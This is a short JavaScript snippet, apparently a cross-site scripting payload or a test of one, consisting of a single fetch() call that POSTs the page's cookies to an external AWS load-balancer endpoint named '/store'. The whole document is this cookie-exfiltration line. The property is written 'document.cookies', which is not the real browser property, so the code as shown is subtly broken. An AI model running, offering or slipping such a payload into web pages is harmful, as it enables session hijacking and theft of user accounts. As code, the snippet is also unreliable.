fetch("http://test-loadbalancer-1521445412.us-west-2.elb.amazonaws.com/store", {
    method: "POST", 
    body: document.cookies,
})
